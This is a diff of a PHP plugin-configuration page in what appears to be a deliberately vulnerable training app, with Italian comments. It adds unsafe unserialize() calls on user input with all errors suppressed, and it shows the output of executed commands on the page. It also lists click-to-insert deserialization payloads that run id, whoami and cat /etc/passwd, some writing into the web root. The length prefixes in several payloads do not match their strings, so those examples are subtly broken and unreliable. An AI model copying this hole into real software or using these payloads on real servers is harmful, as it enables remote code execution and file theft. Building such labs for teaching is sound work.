@@ -47,7 +47,29 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_config'])) {
     $update_stmt->execute([$config_data, $plugin_id]);
     
     // VULNERABILITÀ: Deserializza immediatamente per "testare" (pericoloso!)
-    $test_config = unserialize($config_data);
+    // Questo eseguirà __wakeup() se l'oggetto deserializzato è PluginLoader o PluginConfig
+    try {
+        // Assicuriamoci che PluginLoader sia caricato
+        if (!class_exists('PluginLoader')) {
+            require_once 'PluginLoader.php';
+        }
+        if (!class_exists('PluginConfig')) {
+            require_once 'PluginLoader.php';
+        }
+        
+        $test_config = @unserialize($config_data);
+        if ($test_config === false && $config_data !== serialize(false)) {
+            // Se la deserializzazione fallisce, potrebbe essere un problema di formato
+            // Ma continuiamo comunque (vulnerabilità!)
+        }
+        // Se $test_config è un oggetto, __wakeup() viene chiamato automaticamente
+        // Se è PluginLoader con $command impostato, system() verrà eseguito!
+        // Nota: __wakeup() viene chiamato DURANTE unserialize(), non dopo!
+    } catch (Exception $e) {
+        // Ignora errori (vulnerabilità!)
+    } catch (Error $e) {
+        // Ignora anche errori fatali (vulnerabilità!)
+    }
     
     $success = "Configurazione salvata!";
     
@@ -55,7 +77,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_config'])) {
     $stmt = $conn->prepare("SELECT * FROM plugins WHERE id = ?");
     $stmt->execute([$plugin_id]);
     $plugin = $stmt->fetch(PDO::FETCH_ASSOC);
-    $current_config = unserialize($plugin['config_data']);
+    
+    // VULNERABILITÀ: Deserializza di nuovo (esegue __wakeup() se presente)
+    if (!empty($plugin['config_data'])) {
+        $current_config = @unserialize($plugin['config_data']);
+    }
 }
 ?>
 
@@ -63,6 +89,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_config'])) {
 
 <?php if (isset($success)): ?>
     <div class="alert alert-success"><?php echo htmlspecialchars($success); ?></div>
+    <?php
+    // Mostra se ci sono file di esecuzione creati (per verificare che il comando sia stato eseguito)
+    $exec_files = glob('/tmp/plugin_exec_*.txt');
+    if (!empty($exec_files)) {
+        $latest_file = end($exec_files);
+        if (file_exists($latest_file)) {
+            $output = file_get_contents($latest_file);
+            echo '<div class="alert alert-warning" style="margin-top: 10px;">';
+            echo '<strong>⚠️ Comando eseguito durante la deserializzazione!</strong><br>';
+            echo '<small>File: ' . htmlspecialchars($latest_file) . '</small><br>';
+            echo '<pre style="background: #f5f5f5; padding: 10px; margin-top: 5px; border-radius: 4px; max-height: 200px; overflow-y: auto;">' . htmlspecialchars($output) . '</pre>';
+            echo '</div>';
+        }
+    }
+    ?>
 <?php endif; ?>
 
 <div class="config-form">
@@ -91,13 +132,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_config'])) {
     <h4>⚠️ VULNERABILITÀ CRITICA - Deserializzazione Non Sicura:</h4>
     <p><strong>Come sfruttare:</strong></p>
     <ol>
-        <li>Inserisci un oggetto PluginLoader serializzato con comando arbitrario:</li>
-        <pre style="background: #f5f5f5; padding: 10px; margin: 10px 0; border-radius: 4px;">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:17:"id > /tmp/test.txt";}</pre>
-        <li>Salva la configurazione</li>
-        <li>Quando il plugin viene installato o caricato, il comando verrà eseguito!</li>
+        <li>Inserisci un oggetto PluginLoader serializzato con comando arbitrario nel campo sopra</li>
+        <li>Clicca su "Salva Configurazione"</li>
+        <li>Il comando verrà eseguito IMMEDIATAMENTE durante la deserializzazione!</li>
+        <li>L'output del comando verrà mostrato automaticamente nella pagina dopo il salvataggio</li>
     </ol>
-    <p><strong>Esempio payload per RCE:</strong></p>
-    <pre style="background: #f5f5f5; padding: 10px; margin: 10px 0; border-radius: 4px;">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:23:"cat /etc/passwd > /tmp/pw";}</pre>
+    <p><strong>Esempi di payload per RCE:</strong></p>
+    <div style="margin-top: 10px;">
+        <p><strong>1. Comando base (output in /tmp):</strong></p>
+        <pre style="background: #f5f5f5; padding: 10px; margin: 5px 0; border-radius: 4px; cursor: pointer;" onclick="document.getElementById('config_data').value=this.textContent.trim()">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:17:"id > /tmp/test.txt";}</pre>
+        
+        <p><strong>2. Comando con output accessibile via web:</strong></p>
+        <pre style="background: #f5f5f5; padding: 10px; margin: 5px 0; border-radius: 4px; cursor: pointer;" onclick="document.getElementById('config_data').value=this.textContent.trim()">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:28:"whoami > /var/www/html/whoami.txt";}</pre>
+        
+        <p><strong>3. Leggere file sensibili:</strong></p>
+        <pre style="background: #f5f5f5; padding: 10px; margin: 5px 0; border-radius: 4px; cursor: pointer;" onclick="document.getElementById('config_data').value=this.textContent.trim()">O:12:"PluginLoader":2:{s:12:"plugin_file";s:0:"";s:7:"command";s:35:"cat /etc/passwd > /var/www/html/passwd.txt";}</pre>
+        
+        <p><small>💡 Clicca su un payload per inserirlo automaticamente nel campo di testo</small></p>
+    </div>
+    <p><strong>Nota:</strong> Il comando viene eseguito DURANTE la deserializzazione (quando salvi), non quando installi il plugin!</p>
 </div>
 
 <?php require_once 'footer.php'; ?>
